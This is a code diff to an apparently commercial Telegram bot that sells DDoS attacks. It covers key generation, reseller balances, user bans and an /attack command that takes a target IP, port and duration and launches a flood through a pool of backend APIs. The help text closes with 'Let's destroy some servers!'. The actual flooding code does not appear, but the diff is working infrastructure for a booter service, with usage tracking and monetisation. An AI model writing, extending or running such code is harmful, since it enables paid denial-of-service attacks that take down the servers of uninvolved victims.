         creator = key_doc.get('created_by_username', str(key_doc.get('created_by', 'Unknown')))
-        response += f"👤 Creator: {creator} (Reseller)\n"
+        response += f"👤 {creator} (Reseller)\n"
     else:
-        response += f"👤 Creator: OWNER\n"
-    response += f"\n📊 Status: {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
+        response += f"👤 OWNER\n"
+    response += f"\n📊 {'🔴 USED' if key_doc.get('used') else '🟢 UNUSED'}\n"
     if key_doc.get('used'):
-        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n📅 Used At: {key_doc.get('used_at', 'Unknown')}\n"
+        response += f"👤 Used By: {key_doc.get('used_by', 'Unknown')}\n📅 {key_doc.get('used_at', 'Unknown')}\n"
         user = users_collection.find_one({'key': key_input})
         if user:
-            response += f"\n─── 𝗨𝗦𝗘𝗥 𝗜𝗡𝗙𝗢 ───\n👤 Username: {user.get('username', 'Unknown')}\n🆔 ID: {user.get('user_id', 'Unknown')}\n"
+            response += f"\n─── 𝗨𝗦𝗘𝗥 ───\n👤 {user.get('username', 'Unknown')}\n🆔 {user.get('user_id', 'Unknown')}\n"
             expiry = user.get('key_expiry')
             if expiry:
                 if expiry > datetime.now():
                     remaining = format_timedelta(expiry - datetime.now())
-                    response += f"⏳ Remaining: {remaining}\n✅ Status: ACTIVE\n"
+                    response += f"⏳ {remaining}\n✅ ACTIVE\n"
                 else:
-                    response += f"❌ Status: EXPIRED\n"
+                    response += f"❌ EXPIRED\n"
     response += "\n═══════════════════════════"
     bot.reply_to(message, response)
 
 @bot.message_handler(commands=["allkeys"])
 def list_keys_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     unused_keys = list(keys_collection.find({'used': False}))
     used_keys = list(keys_collection.find({'used': True}).sort('used_at', -1))
-    content = "═══════════════════════════\n       ALL KEYS REPORT\n" + f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\n"
-    content += f"🟢 UNUSED KEYS ({len(unused_keys)})\n───────────────────────────\n"
+    content = "═══════════════════════════\n       ALL KEYS REPORT\n" + f"    {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\n"
+    content += f"🟢 UNUSED ({len(unused_keys)})\n───────────────────────────\n"
     for i, key in enumerate(unused_keys, 1):
-        content += f"{i}. {key['key']}\n   Duration: {key.get('duration_label', 'N/A')}\n   Created: {key.get('created_at', 'N/A')}\n"
+        content += f"{i}. {key['key']}\n   {key.get('duration_label', 'N/A')}\n   {key.get('created_at', 'N/A')}\n"
         if key.get('created_by_username'):
             content += f"   By: {key.get('created_by_username')}\n"
         content += "\n"
     if not unused_keys:
         content += "   No unused keys\n\n"
-    content += f"\n🔴 USED KEYS ({len(used_keys)})\n───────────────────────────\n"
+    content += f"\n🔴 USED ({len(used_keys)})\n───────────────────────────\n"
     for i, key in enumerate(used_keys, 1):
-        content += f"{i}. {key['key']}\n   Duration: {key.get('duration_label', 'N/A')}\n   Used by: {key.get('used_by', 'N/A')}\n"
+        content += f"{i}. {key['key']}\n   {key.get('duration_label', 'N/A')}\n   Used by: {key.get('used_by', 'N/A')}\n"
         if key.get('used_at'):
             content += f"   Used at: {key['used_at'].strftime('%d-%m-%Y %H:%M')}\n"
         if key.get('created_by_username'):
@@ -2094,13 +2016,11 @@ def list_keys_command(message):
 
 @bot.message_handler(commands=["allusers"])
 def all_users_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     all_users = list(users_collection.find({'key': {'$ne': None}}).sort('key_expiry', -1))
     if not all_users:
-        bot.reply_to(message, "📋 Koi user nahi hai!")
+        bot.reply_to(message, "📋 Koi user nahi!")
         return
     active_users = []
     expired_users = []
@@ -2109,8 +2029,8 @@ def all_users_command(message):
             active_users.append(user)
         else:
             expired_users.append(user)
-    content = "═══════════════════════════\n       ALL USERS REPORT\n" + f"    Generated: {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\n"
-    content += f"🟢 ACTIVE USERS ({len(active_users)})\n───────────────────────────\n"
+    content = "═══════════════════════════\n       ALL USERS REPORT\n" + f"    {datetime.now().strftime('%d-%m-%Y %H:%M')}\n" + "═══════════════════════════\n\n"
+    content += f"🟢 ACTIVE ({len(active_users)})\n───────────────────────────\n"
     for i, user in enumerate(active_users, 1):
         remaining = user['key_expiry'] - datetime.now()
         days = remaining.days
@@ -2118,19 +2038,19 @@ def all_users_command(message):
         minutes, _ = divmod(remainder, 60)
         time_str = f"{days}d {hours}h {minutes}m"
         attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
-        content += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {user.get('key', 'N/A')}\n   Duration: {user.get('key_duration_label', 'N/A')}\n   Time Left: {time_str}\n   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n   Total Attacks: {attack_count}\n"
+        content += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {user.get('key', 'N/A')}\n   Duration: {user.get('key_duration_label', 'N/A')}\n   Left: {time_str}\n   Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n   Attacks: {attack_count}\n"
         if user.get('reseller_username'):
             content += f"   Reseller: @{user['reseller_username']}\n"
         content += "\n"
     if not active_users:
         content += "   No active users\n\n"
-    content += f"\n🔴 EXPIRED USERS ({len(expired_users)})\n───────────────────────────\n"
+    content += f"\n🔴 EXPIRED ({len(expired_users)})\n───────────────────────────\n"
     for i, user in enumerate(expired_users, 1):
         attack_count = attack_logs_collection.count_documents({'user_id': user['user_id']})
         content += f"{i}. {user.get('username', 'Unknown')}\n   ID: {user['user_id']}\n   Key: {user.get('key', 'N/A')}\n"
         if user.get('key_expiry'):
             content += f"   Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n"
-        content += f"   Total Attacks: {attack_count}\n\n"
+        content += f"   Attacks: {attack_count}\n\n"
     if not expired_users:
         content += "   No expired users\n"
     content += "\n═══════════════════════════\n" + f"TOTAL: {len(active_users)} Active | {len(expired_users)} Expired\n" + "═══════════════════════════"
@@ -2144,9 +2064,7 @@ pending_del_exp_key = {}
 
 @bot.message_handler(commands=["del_exp_usr"])
 def del_exp_usr_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     all_users = list(users_collection.find({'key': {'$ne': None}}))
     expired_users = []
@@ -2154,10 +2072,10 @@ def del_exp_usr_command(message):
         if not user.get('key_expiry') or user['key_expiry'] <= datetime.now():
             expired_users.append(user)
     if not expired_users:
-        bot.reply_to(message, "✅ Koi expired user nahi hai!")
+        bot.reply_to(message, "✅ Koi expired user nahi!")
         return
-    pending_del_exp[user_id] = expired_users
-    bot.reply_to(message, f"⚠️ {len(expired_users)} expired users milein!\n\nConfirm: /confirm_del_exp\nCancel: /cancel_del")
+    pending_del_exp[message.from_user.id] = expired_users
+    bot.reply_to(message, f"⚠️ {len(expired_users)} expired users!\n\n/confirm_del_exp\n/cancel_del")
 
 @bot.message_handler(commands=["confirm_del_exp"])
 def confirm_del_exp_command(message):
@@ -2176,7 +2094,7 @@ def confirm_del_exp_command(message):
             deleted_count += 1
         except:
             pass
-    bot.reply_to(message, f"✅ {deleted_count} expired users delete ho gaye!")
+    bot.reply_to(message, f"✅ {deleted_count} deleted!")
 
 @bot.message_handler(commands=["cancel_del"])
 def cancel_del_command(message):
@@ -2191,15 +2109,13 @@ def cancel_del_command(message):
         del pending_del_exp_key[user_id]
         cancelled = True
     if cancelled:
-        bot.reply_to(message, "❌ Delete operation cancelled!")
+        bot.reply_to(message, "❌ Cancelled!")
     else:
-        bot.reply_to(message, "ℹ️ Koi pending delete nahi hai.")
+        bot.reply_to(message, "ℹ️ Koi pending nahi.")
 
 @bot.message_handler(commands=["del_exp_key"])
 def del_exp_key_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     all_used_keys = list(keys_collection.find({'used': True}))
     expired_keys = []
@@ -2211,10 +2127,10 @@ def del_exp_key_command(message):
         else:
             expired_keys.append(key)
     if not expired_keys:
-        bot.reply_to(message, "✅ Koi expired key nahi hai!")
+        bot.reply_to(message, "✅ Koi expired key nahi!")
         return
-    pending_del_exp_key[user_id] = expired_keys
-    bot.reply_to(message, f"⚠️ {len(expired_keys)} expired keys milein!\n\nConfirm: /confirm_del_exp_key\nCancel: /cancel_del")
+    pending_del_exp_key[message.from_user.id] = expired_keys
+    bot.reply_to(message, f"⚠️ {len(expired_keys)} expired keys!\n\n/confirm_del_exp_key\n/cancel_del")
 
 @bot.message_handler(commands=["confirm_del_exp_key"])
 def confirm_del_exp_key_command(message):
@@ -2233,29 +2149,24 @@ def confirm_del_exp_key_command(message):
             deleted_count += 1
         except:
             pass
-    bot.reply_to(message, f"✅ {deleted_count} expired keys delete ho gayi!")
+    bot.reply_to(message, f"✅ {deleted_count} deleted!")
 
-# ============================================================
-# ===== FEEDBACK TOGGLE COMMANDS =====
-# ============================================================
 @bot.message_handler(commands=["feedback_on"])
 def feedback_on_command(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
         return
     set_feedback_enabled(True)
-    bot.reply_to(message, "✅ Feedback enabled! Users must send screenshot after each attack.")
+    bot.reply_to(message, "✅ Feedback ON!")
 
 @bot.message_handler(commands=["feedback_off"])
 def feedback_off_command(message):
     if not is_owner(message.from_user.id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
         return
     set_feedback_enabled(False)
-    bot.reply_to(message, "✅ Feedback disabled! Users can attack without sending screenshot.")
+    bot.reply_to(message, "✅ Feedback OFF!")
 
 # ============================================================
-# ===== ATTACK - MAIN (UPDATED) =====
+# ===== ATTACK - MAIN =====
 # ============================================================
 @bot.message_handler(commands=["attack"])
 def handle_attack(message):
@@ -2264,7 +2175,7 @@ def handle_attack(message):
     user_id = message.from_user.id
     chat_id = message.chat.id
     is_group = message.chat.type not in ['private', 'personal']
-    
+
     if is_group:
         if not check_group_approval(message):
             return
@@ -2272,54 +2183,52 @@ def handle_attack(message):
         if not has_valid_key(user_id):
             user = users_collection.find_one({'user_id': user_id})
             if user and user.get('reseller_username'):
-                bot.reply_to(message, f"❌ Key khatam ho gayi!\n🔄 Renew ke liye DM karo: @{user.get('reseller_username')}")
+                bot.reply_to(message, f"❌ Key khatam!\n🔄 @{user.get('reseller_username')}")
             else:
-                bot.reply_to(message, "❌ Tumhare paas valid key nahi hai!\n🔑 Key kharidne ke liye reseller se contact karo.")
+                bot.reply_to(message, "❌ Valid key nahi hai!\n🔑 Reseller se contact karo.")
             return
-    
+
     if protection.is_ddos_attack(user_id, message.chat.id):
-        bot.reply_to(message, "🚫 DDoS Protection: Too many requests! Wait 5 seconds.")
+        bot.reply_to(message, "🚫 DDoS Protection: Too many requests!")
         return
     if not check_channel_join(message):
         return
-    
-    # Only check pending feedback if feedback is enabled
+
     if get_feedback_enabled() and not is_owner(user_id):
         fb = get_pending_feedback(user_id)
         if fb:
-            bot.reply_to(message, f"📸 Pehle attack ka screenshot bhejo!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
+            bot.reply_to(message, f"📸 Pehle screenshot bhejo!\n🎯 {fb['target']}:{fb['port']} ⏱️ {fb['duration']}s")
             return
         cooldown = get_user_cooldown(user_id, is_group)
         if cooldown > 0:
-            bot.reply_to(message, f"⏳ Cooldown active! Wait: {cooldown}s")
+            bot.reply_to(message, f"⏳ Cooldown! Wait: {cooldown}s")
             return
         if user_has_active_attack(user_id):
             bot.reply_to(message, "❌ Tumhara pehle se ek attack chal raha hai!")
             return
-    
+
     active_count = get_active_attack_count()
-    max_concurrent = len(API_LIST)  # 5 slots
+    max_concurrent = len(API_LIST)
     if active_count >= max_concurrent:
-        bot.reply_to(message, f"❌ Abhi chudai lgi hui hai! ({active_count}/{max_concurrent})\n\n/status se check kro")
+        bot.reply_to(message, f"❌ Sab slots busy! ({active_count}/{max_concurrent})\n\n/status")
         return
-    
+
     command_parts = message.text.split()
     if len(command_parts) != 4:
-        # SIMPLIFIED USAGE MESSAGE
         bot.reply_to(message, "⚠️ Usage: /attack <ip> <port> <time>")
         return
-    
+
     target, port, duration = command_parts[1], command_parts[2], command_parts[3]
     if not validate_target(target):
         bot.reply_to(message, "❌ Invalid IP!")
         return
     if is_ip_blocked(target):
-        bot.reply_to(message, "🚫 Ye IP blocked hai! Dusra IP use karo.")
+        bot.reply_to(message, "🚫 Ye IP blocked hai!")
         return
     try:
         port = int(port)
         if port < 1 or port > 65535:
-            bot.reply_to(message, "❌ Invalid port! (1-65535)")
+            bot.reply_to(message, "❌ Invalid port!")
             return
         duration = int(duration)
         if is_group:
@@ -2334,7 +2243,7 @@ def handle_attack(message):
         attack_id = f"{user_id}_{datetime.now().timestamp()}"
         api_index = get_free_api_index()
         if api_index is None:
-            bot.reply_to(message, "❌ Koi free slot nahi mila! Wait karo.")
+            bot.reply_to(message, "❌ Koi free slot nahi mila!")
             return
         with _attack_lock:
             user_cooldowns[user_id] = datetime.now() + timedelta(seconds=cooldown_time + duration)
@@ -2349,7 +2258,7 @@ def handle_attack(message):
                 'user_id': user_id,
                 'start_time': datetime.now(),
                 'end_time': datetime.now() + timedelta(seconds=duration),
-                'is_group': is_group   # <--- added for status
+                'is_group': is_group
             }
         thread = threading.Thread(target=start_attack, args=(target, port, duration, message, attack_id, api_index, is_group))
         thread.start()
@@ -2365,11 +2274,11 @@ def show_help(message):
         help_text = '''
 👑 OWNER PANEL
 
-🔑 KEY MGMT: /gen, /key, /allkeys, /delkey, /delete_key, /del_exp_key, /trail, /reseller_trail, /del_trail
-👥 USER MGMT: /user, /allusers, /extend, /extend_all, /down, /del_exp_usr, /ban, /unban, /banned, /tban
+🔑 KEY: /gen, /key, /allkeys, /delkey, /del_exp_key, /trail, /reseller_trail, /del_trail
+👥 USER: /user, /allusers, /extend, /extend_all, /down, /del_exp_usr, /ban, /unban, /banned, /tban
 💼 RESELLER: /add_reseller, /remove_reseller, /block_reseller, /unblock_reseller, /all_resellers, /saldo_add, /saldo_remove, /saldo, /user_resell, /setprice
 📢 BROADCAST: /broadcast, /broadcast_reseller, /broadcast_paid
-⚡ ATTACK: /attack, /status, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
+⚡ ATTACK: /attack, /status, /testapi, /settings, /private_max, /group_max, /private_cooldown, /group_cooldown
 🛡️ PROTECTION: /ddos_on, /ddos_off, /required_on, /required_off
 📢 GROUP: /addgrp, /removegrp, /groups, /channels
 🎬 REEL: /reel_on, /reel_off, /addreel, /removereel, /listreels
@@ -2377,28 +2286,27 @@ def show_help(message):
 📊 MONITOR: /live, /logs, /del_logs
 🔧 MAINTENANCE: /maintenance, /ok
 
-🔢 Max Concurrent Attacks: 5
+🔢 Max Concurrent: 5
 '''
     elif is_reseller(user_id):
         help_text = '''
 💼 RESELLER PANEL
 
-🆔 ID: /id, /ping
-💰 BALANCE: /mysaldo, /prices
-🔑 KEY GEN: /gen <duration> <count>
-⚡ ATTACK: /redeem, /attack, /status, /mykey
-🔢 Max Concurrent Attacks: 5
+🆔 /id, /ping
+💰 /mysaldo, /prices
+🔑 /gen <duration> <count>
+⚡ /redeem, /attack, /status, /mykey
+🔢 Max Concurrent: 5
 '''
     else:
-        # ===== SIMPLIFIED USER HELP =====
-        help_text = f'''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥
+        help_text = '''🔐 𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗨𝗦𝗘𝗥
 
-• /attack <ip> <port> <time> – ⚡ Launch an attack
-• /status – 📊 Live attack progress
-• /mykey – 📦 Check your plan details
-• /redeem <key> – 🔑 Activate your key
-• /verify – ✅ Check channel membership
-• /id – 🆔 Your user ID
+• /attack <ip> <port> <time> – ⚡ Launch attack
+• /status – 📊 Live progress
+• /mykey – 📦 Plan details
+• /redeem <key> – 🔑 Activate
+• /verify – ✅ Channel check
+• /id – 🆔 Your ID
 • /ping – 🏓 Bot status
 
 🔥 𝗟𝗲𝘁’𝘀 𝗱𝗲𝘀𝘁𝗿𝗼𝘆 𝘀𝗼𝗺𝗲 𝘀𝗲𝗿𝘃𝗲𝗿𝘀! 💥'''
@@ -2406,9 +2314,7 @@ def show_help(message):
 
 @bot.message_handler(commands=["delete_key"])
 def delete_key_alt_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2418,15 +2324,13 @@ def delete_key_alt_command(message):
     result = keys_collection.delete_one({'key': key_input})
     if result.deleted_count > 0:
         users_collection.update_one({'key': key_input}, {'$set': {'key': None, 'key_expiry': None}})
-        bot.reply_to(message, f"✅ Key `{key_input}` deleted!", parse_mode="Markdown")
+        bot.reply_to(message, f"✅ Deleted!", parse_mode="Markdown")
     else:
         bot.reply_to(message, "❌ Key nahi mili!")
 
 @bot.message_handler(commands=["del_trail"])
 def delete_trail_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) == 1:
@@ -2434,15 +2338,13 @@ def delete_trail_command(message):
         return
     if command_parts[1].lower() == "confirm":
         result = keys_collection.delete_many({'is_trail': True})
-        bot.reply_to(message, f"✅ {result.deleted_count} trail keys delete ho gayi!")
+        bot.reply_to(message, f"✅ {result.deleted_count} trail keys deleted!")
     else:
-        bot.reply_to(message, "❌ Confirmation failed! /del_trail confirm")
+        bot.reply_to(message, "❌ Confirm failed!")
 
 @bot.message_handler(commands=["tban"])
 def tban_user_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 3:
@@ -2453,7 +2355,7 @@ def tban_user_command(message):
         bot.reply_to(message, "❌ User nahi mila!")
         return
     if target_user_id == BOT_OWNER:
-        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
+        bot.reply_to(message, "❌ Owner ko ban nahi!")
         return
     duration_str = command_parts[2]
     duration_td, label = parse_duration(duration_str)
@@ -2462,13 +2364,11 @@ def tban_user_command(message):
         return
     ban_expiry = datetime.now() + duration_td
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'banned': True, 'ban_type': 'temporary', 'ban_expiry': ban_expiry}}, upsert=True)
-    bot.reply_to(message, f"🚫 User {resolved_name or target_user_id} ko {label} ke liye ban kar diya!\n⏳ Expiry: {ban_expiry.strftime('%d-%m-%Y %H:%M:%S')}")
+    bot.reply_to(message, f"🚫 {resolved_name or target_user_id} banned {label}!\n⏳ {ban_expiry.strftime('%d-%m-%Y %H:%M')}")
 
 @bot.message_handler(commands=["ban"])
 def ban_user_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2479,21 +2379,19 @@ def ban_user_command(message):
         bot.reply_to(message, "❌ User nahi mila!")
         return
     if target_user_id == BOT_OWNER:
-        bot.reply_to(message, "❌ Owner ko ban nahi kar sakte!")
+        bot.reply_to(message, "❌ Owner ko ban nahi!")
         return
     users_collection.update_one({'user_id': target_user_id}, {'$set': {'user_id': target_user_id, 'username': resolved_name, 'banned': True, 'banned_at': datetime.now()}}, upsert=True)
     try:
-        bot.send_message(target_user_id, "🚫 Aapko ban kar diya gaya hai!")
+        bot.send_message(target_user_id, "🚫 Aapko ban kar diya gaya!")
     except:
         pass
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
-    bot.reply_to(message, f"✅ User {display} banned!\n🆔 ID: {target_user_id}")
+    bot.reply_to(message, f"✅ {display} banned!")
 
 @bot.message_handler(commands=["unban"])
 def unban_user_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2507,36 +2405,32 @@ def unban_user_command(message):
     display = f"@{resolved_name}" if resolved_name else str(target_user_id)
     if result.modified_count > 0:
         try:
-            bot.send_message(target_user_id, "✅ Aapka ban hata diya gaya hai!")
+            bot.send_message(target_user_id, "✅ Ban removed!")
         except:
             pass
-        bot.reply_to(message, f"✅ User {display} unbanned!\n🆔 ID: {target_user_id}")
+        bot.reply_to(message, f"✅ {display} unbanned!")
     else:
-        bot.reply_to(message, "❌ User nahi mila ya pehle se unbanned hai!")
+        bot.reply_to(message, "❌ User nahi mila!")
 
 @bot.message_handler(commands=["banned"])
 def list_banned_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     banned_users = list(users_collection.find({'banned': True}))
     if not banned_users:
-        bot.reply_to(message, "📋 Koi banned user nahi hai!")
+        bot.reply_to(message, "📋 Koi banned user nahi!")
         return
     response = "═══════════════════════════\n🚫 BANNED USERS\n═══════════════════════════\n\n"
     for i, user in enumerate(banned_users[:20], 1):
         response += f"{i}. 👤 `{user['user_id']}`\n"
         if user.get('username'):
             response += f"   📛 {user['username']}\n"
-    response += f"\n═══════════════════════════\n📊 Total Banned: {len(banned_users)}"
+    response += f"\n═══════════════════════════\n📊 Total: {len(banned_users)}"
     send_long_message(message, response)
 
 @bot.message_handler(commands=["user"])
 def user_info_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     command_parts = message.text.split()
     if len(command_parts) != 2:
@@ -2550,72 +2444,45 @@ def user_info_command(message):
     reseller = resellers_collection.find_one({'user_id': target_user_id})
     bot_user = bot_users_collection.find_one({'user_id': target_user_id})
     response = "═══════════════════════════\n👤 USER INFO\n═══════════════════════════\n\n"
-    response += f"🆔 ID: <code>{target_user_id}</code>\n"
+    response += f"🆔 <code>{target_user_id}</code>\n"
     if resolved_name:
-        response += f"📛 Username: @{resolved_name}\n"
+        response += f"📛 @{resolved_name}\n"
     if bot_user:
         if bot_user.get('first_name'):
-            response += f"👤 Name: {bot_user.get('first_name')}\n"
-        if bot_user.get('first_seen'):
-            response += f"📅 First Seen: {bot_user['first_seen'].strftime('%d-%m-%Y %H:%M')}\n"
+            response += f"👤 {bot_user.get('first_name')}\n"
     if target_user_id == BOT_OWNER:
         response += "\n👑 Role: OWNER\n"
     elif reseller:
-        response += f"\n💼 Role: RESELLER\n💰 Balance: {reseller.get('balance', 0)} Rs\n🔑 Keys Generated: {reseller.get('total_keys_generated', 0)}\n📊 Status: {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}\n"
+        response += f"\n💼 RESELLER\n💰 {reseller.get('balance', 0)} Rs\n🔑 {reseller.get('total_keys_generated', 0)}\n📊 {'🚫 Blocked' if reseller.get('blocked') else '✅ Active'}\n"
     else:
-        response += "\n👤 Role: USER\n"
+        response += "\n👤 USER\n"
     if user:
         response += "\n═══════════════════════════\n🔑 KEY DETAILS\n═══════════════════════════\n\n"
         if user.get('banned'):
             response += "🚫 STATUS: BANNED\n"
         if user.get('key'):
-            response += f"🔑 Key: <code>{user['key']}</code>\n⏰ Duration: {user.get('key_duration_label', 'N/A')}\n"
-            if user.get('redeemed_at'):
-                response += f"📅 Redeemed: {user['redeemed_at'].strftime('%d-%m-%Y %H:%M')}\n"
+            response += f"🔑 <code>{user['key']}</code>\n⏰ {user.get('key_duration_label', 'N/A')}\n"
             if user.get('key_expiry'):
                 if user['key_expiry'] > datetime.now():
                     remaining = user['key_expiry'] - datetime.now()
                     days = remaining.days
                     hours, rem = divmod(remaining.seconds, 3600)
                     mins, secs = divmod(rem, 60)
-                    response += f"⏳ Remaining: {days}d {hours}h {mins}m\n📆 Expires: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n✅ Status: ACTIVE\n"
+                    response += f"⏳ {days}d {hours}h {mins}m\n✅ ACTIVE\n"
                 else:
-                    response += f"📆 Expired: {user['key_expiry'].strftime('%d-%m-%Y %H:%M')}\n❌ Status: EXPIRED\n"
+                    response += f"❌ EXPIRED\n"
             if user.get('reseller_username'):
-                response += f"💼 Reseller: @{user['reseller_username']}\n"
+                response += f"💼 @{user['reseller_username']}\n"
         else:
             response += "❌ No Active Key\n"
-    else:
-        response += "\n❌ No Key History\n"
-    user_keys = list(keys_collection.find({'used_by': target_user_id}).sort('used_at', -1).limit(5))
-    if user_keys:
-        response += "\n═══════════════════════════\n📜 KEY HISTORY (Last 5)\n═══════════════════════════\n\n"
-        for k in user_keys:
-            response += f"• {k.get('duration_label', 'N/A')}"
-            if k.get('used_at'):
-                response += f" ({k['used_at'].strftime('%d-%m-%Y')})"
-            response += "\n"
     attack_count = attack_logs_collection.count_documents({'user_id': target_user_id})
-    user_attacks = list(attack_logs_collection.find({'user_id': target_user_id}).sort('timestamp', -1).limit(10))
-    response += "\n═══════════════════════════\n⚔️ ATTACK STATS\n═══════════════════════════\n\n"
-    response += f"📊 Total Attacks: {attack_count}\n"
-    if user_attacks:
-        response += "\n📜 Recent Attacks:\n"
-        for i, atk in enumerate(user_attacks[:5], 1):
-            response += f"{i}. {atk['target']}:{atk['port']} ({atk['duration']}s)\n"
-            if atk.get('timestamp'):
-                response += f"   📅 {atk['timestamp'].strftime('%d-%m-%Y %H:%M')}\n"
-    fb = get_pending_feedback(target_user_id)
-    if fb:
-        response += "\n⚠️ Pending Feedback: YES\n"
+    response += f"\n📊 Total Attacks: {attack_count}\n"
     response += "\n═══════════════════════════"
     bot.reply_to(message, response, parse_mode="HTML")
 
 @bot.message_handler(commands=["live"])
 def live_stats_command(message):
-    user_id = message.from_user.id
-    if not is_owner(user_id):
-        bot.reply_to(message, "❌ Ye command sirf owner use kar sakta hai!")
+    if not is_owner(message.from_user.id):
         return
     uptime = datetime.now() - BOT_START_TIME
     hours, remainder = divmod(int(uptime.total_seconds()), 3600)
@@ -2625,53 +2492,30 @@ def live_stats_command(message):
     memory_mb = process.memory_info().rss / 1024 / 1024
     cpu_percent = process.cpu_percent(interval=0.1)
     threads = process.num_threads()
-    cpu_overall = psutil.cpu_percent(interval=0.1)
-    ram = psutil.virtual_memory()
-    ram_used = ram.used / 1024 / 1024
-    ram_total = ram.total / 1024 / 1024
-    ram_percent = ram.percent
-    disk = psutil.disk_usage('/')
-    disk_percent = disk.percent
-    import platform
-    system_info = f"{platform.system()} {platform.release()}"
     total_users = users_collection.count_documents({})
     active_users = users_collection.count_documents({'key_expiry': {'$gt': datetime.now()}})
-    online_threshold = datetime.now() - timedelta(minutes=5)
-    online_users = bot_users_collection.count_documents({'last_seen': {'$gt': online_threshold}})
     total_resellers = resellers_collection.count_documents({})
     active_keys = keys_collection.count_documents({'used': False})
     total_keys = keys_collection.count_documents({})
     active_count = get_active_attack_count()
     max_concurrent = len(API_LIST)
-    maint_status = "🔴 Enabled" if is_maintenance() else "✅ Disabled"
-    channel_status = "✅ REQUIRED" if get_channel_required() else "❌ Not Required"
-    ddos_status = "✅ ON" if get_ddos_protection() else "❌ OFF"
-    group_count = len(get_approved_groups())
-    reel_count = len(get_reel_list())
-    reel_status = "✅ ON" if get_reel_enabled() else "❌ OFF"
-    feedback_status = "✅ ON" if get_feedback_enabled() else "❌ OFF"
     response = "═══════════════════════════\n📊 SERVER STATS\n═══════════════════════════\n\n"
-    response += "🤖 BOT INFO\n• Uptime: {uptime_str}\n• Memory: {memory_mb:.1f} MB\n• CPU: {cpu_percent:.1f}%\n• Threads: {threads}\n\n"
-    response += "💻 SYSTEM\n• {system_info}\n• CPU: {cpu_overall:.1f}% overall\n• RAM: {ram_percent:.1f}% ({ram_used:.0f}MB/{ram_total:.0f}MB)\n• Disk: {disk_percent:.1f}%\n\n"
-    response += f"• Active Attacks: {active_count}/{max_concurrent}\n• Maintenance: {maint_status}\n• Channel: {channel_status}\n• DDoS: {ddos_status}\n• Groups: {group_count}\n• Reels: {reel_count} ({reel_status})\n• Feedback: {feedback_status}\n\n"
-    response += "📈 DATA\n• Total Users: {total_users}\n• Active Users (Keys): {active_users}\n• Online Users: {online_users}\n• Resellers: {total_resellers}\n• Available Keys: {active_keys}\n• Total Keys: {total_keys}\n\n"
-    response += "⚙️ SETTINGS\n• Private Max Time: {get_private_max_attack_time()}s\n• Group Max Time: {get_group_max_attack_time()}s\n• Private Cooldown: {get_private_cooldown()}s\n• Group Cooldown: {get_group_cooldown()}s"
-    response += "\n\n═══════════════════════════"
-    bot.reply_to(message, response.format(**locals()))
+    response += f"🤖 BOT\n• Uptime: {uptime_str}\n• Memory: {memory_mb:.1f} MB\n• CPU: {cpu_percent:.1f}%\n• Threads: {threads}\n\n"
